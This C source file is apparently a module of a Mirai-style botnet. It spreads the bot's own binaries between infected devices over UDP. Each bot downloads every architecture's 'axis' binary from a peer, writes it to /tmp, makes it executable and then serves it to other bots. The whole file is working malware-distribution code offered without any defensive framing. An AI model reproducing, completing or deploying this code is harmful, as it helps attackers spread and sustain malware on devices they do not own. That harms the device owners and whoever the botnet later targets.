#include "includes.h"
#include "p2pfile.h"
#include "rand.h"

/* ============================================================================
 * P2P FILE SHARING - Torrent-style binary distribution
 * ============================================================================
 * Every bot downloads ALL binaries and becomes a seeder.
 * Binaries are served in 4KB chunks via UDP.
 * ============================================================================ */

static bot_binary_t binaries[BOT_ARCH_COUNT];
static int binaries_loaded = 0;
static int listen_fd = -1;
static BOOL running = FALSE;

/* Load a single binary from disk */
static int load_binary_from_disk(const char *arch) {
    char path[128];
    int file_fd;
    struct stat st;

    /* Try multiple paths */
    const char *search_paths[] = {
        "/tmp/axis.%s",
        "./axis.%s",
        "bins/axis.%s",
        NULL
    };

    for (const char **fmt = search_paths; *fmt != NULL; fmt++) {
        snprintf(path, sizeof(path), *fmt, arch);
        file_fd = open(path, O_RDONLY);
        if (file_fd != -1) break;
    }

    if (file_fd == -1) return -1;

    /* Get file size */
    if (fstat(file_fd, &st) == -1) {
        close(file_fd);
        return -1;
    }

    if (st.st_size <= 0 || st.st_size > 10 * 1024 * 1024) {
        close(file_fd);
        return -1;
    }

    /* Allocate and read */
    for (int i = 0; i < BOT_ARCH_COUNT; i++) {
        if (strcmp(binaries[i].arch, arch) == 0) {
            if (binaries[i].data != NULL) free(binaries[i].data);

            binaries[i].data = malloc(st.st_size);
            if (binaries[i].data == NULL) {
                close(file_fd);
                return -1;
            }

            int n = read(file_fd, binaries[i].data, st.st_size);
            close(file_fd);

            if (n > 0) {
                binaries[i].size = n;
                binaries[i].chunk_count = (n + CHUNK_SIZE - 1) / CHUNK_SIZE;
                binaries[i].is_seeder = 1;
                binaries_loaded++;
                return 0;
            }

            free(binaries[i].data);
            binaries[i].data = NULL;
            return -1;
        }
    }

    close(file_fd);
    return -1;
}

/* Find binary entry by architecture name */
static int find_binary_index(const char *arch) {
    for (int i = 0; i < BOT_ARCH_COUNT; i++) {
        if (strncmp(binaries[i].arch, arch, sizeof(binaries[i].arch) - 1) == 0)
            return i;
    }
    return -1;
}

void p2pfile_init(void) {
    memset(binaries, 0, sizeof(binaries));

    /* Initialize architecture names */
    for (int i = 0; i < BOT_ARCH_COUNT; i++) {
        strncpy(binaries[i].arch, bot_archs[i], sizeof(binaries[i].arch) - 1);
        binaries[i].data = NULL;
        binaries[i].size = 0;
        binaries[i].chunk_count = 0;
        binaries[i].is_seeder = 0;
    }

    /* Try to load binaries from disk (if already downloaded) */
    for (int i = 0; i < BOT_ARCH_COUNT; i++) {
        load_binary_from_disk(bot_archs[i]);
    }
}

void p2pfile_start(void) {
    struct sockaddr_in addr;
    int opt = 1;

    listen_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (listen_fd == -1) return;

    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(P2PFILE_PORT);

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        close(listen_fd);
        listen_fd = -1;
        return;
    }

    running = TRUE;
}

int p2pfile_download(const char *arch, ipv4_t seed_addr, port_t seed_port) {
    int fd;
    struct sockaddr_in to;
    uint8_t req[64], resp[8192];
    char path[128];
    int file_fd = -1, total = 0, chunk = 0;
    int idx = find_binary_index(arch);

    if (idx == -1) return -1;

    /* Open output file */
    snprintf(path, sizeof(path), "/tmp/axis.%s", arch);
    file_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (file_fd == -1) return -1;

    /* Connect to seed peer */
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        close(file_fd);
        return -1;
    }

    to.sin_family = AF_INET;
    to.sin_addr.s_addr = seed_addr;
    to.sin_port = seed_port;

    /* Request chunks sequentially (torrent-style, but from a single peer) */
    while (TRUE) {
        /* Build request */
        req[0] = P2PFILE_REQ;
        req[1] = chunk & 0xFF;
        req[2] = (chunk >> 8) & 0xFF;
        strncpy((char *)(req + 3), arch, sizeof(req) - 3);

        /* Send request */
        sendto(fd, req, sizeof(req), 0, (struct sockaddr *)&to, sizeof(to));

        /* Wait for response */
        fd_set fdset;
        struct timeval tv;
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);
        tv.tv_sec = 3;
        tv.tv_usec = 0;

        if (select(fd + 1, &fdset, NULL, NULL, &tv) <= 0) {
            /* Timeout - peer may be offline, try next seed */
            break;
        }

        /* Receive data */
        socklen_t from_len = sizeof(to);
        int n = recvfrom(fd, resp, sizeof(resp), 0, (struct sockaddr *)&to, &from_len);
        if (n <= 4 || resp[0] != P2PFILE_DATA) {
            break;
        }

        /* Write chunk */
        int chunk_len = (resp[3] << 8) | resp[2];
        write(file_fd, resp + 4, chunk_len);
        total += chunk_len;
        chunk++;

        /* Safety limit */
        if (chunk > 256) break;  /* 256 * 4KB = 1MB max */
    }

    close(fd);
    close(file_fd);

    if (total > 0) {
        /* Make executable */
        chmod(path, 0777);

        /* Mark as seeder - load into memory */
        load_binary_from_disk(arch);
        return 0;
    }

    /* Clean up incomplete download */
    unlink(path);
    return -1;
}

int p2pfile_download_all(ipv4_t seed_addr, port_t seed_port) {
    int success = 0;

    /* Try to download each architecture */
    for (int i = 0; i < BOT_ARCH_COUNT; i++) {
        /* Skip if we already have it */
        if (binaries[i].is_seeder) {
            success++;
            continue;
        }

        if (p2pfile_download(bot_archs[i], seed_addr, seed_port) == 0) {
            success++;
        }
    }

    return success;
}

void p2pfile_handle_request(struct sockaddr_in *from, uint8_t *buf, int len, int fd) {
    if (len < 4) return;

    int chunk_id = buf[1] | (buf[2] << 8);
    char *filename = (char *)(buf + 3);
    filename[31] = '\0';

    /* Find file */
    int idx = find_binary_index(filename);
    if (idx == -1 || !binaries[idx].is_seeder || binaries[idx].data == NULL) {
        return;  /* Not serving this binary */
    }

    /* Send chunk */
    uint8_t resp[8192];
    int offset = chunk_id * CHUNK_SIZE;

    if (offset >= (int)binaries[idx].size) {
        return;  /* Chunk out of range */
    }

    int chunk_len = CHUNK_SIZE;
    if (offset + chunk_len > (int)binaries[idx].size) {
        chunk_len = binaries[idx].size - offset;
    }

    resp[0] = P2PFILE_DATA;
    resp[1] = chunk_id & 0xFF;
    resp[2] = chunk_len & 0xFF;
    resp[3] = (chunk_len >> 8) & 0xFF;
    memcpy(resp + 4, binaries[idx].data + offset, chunk_len);

    sendto(fd, resp, 4 + chunk_len, 0, (struct sockaddr *)from, sizeof(*from));
}

int p2pfile_has_binary(const char *arch) {
    return find_binary_index(arch) != -1;
}

int p2pfile_seeder_count(void) {
    int count = 0;
    for (int i = 0; i < BOT_ARCH_COUNT; i++) {
        if (binaries[i].is_seeder) count++;
    }
    return count;
}
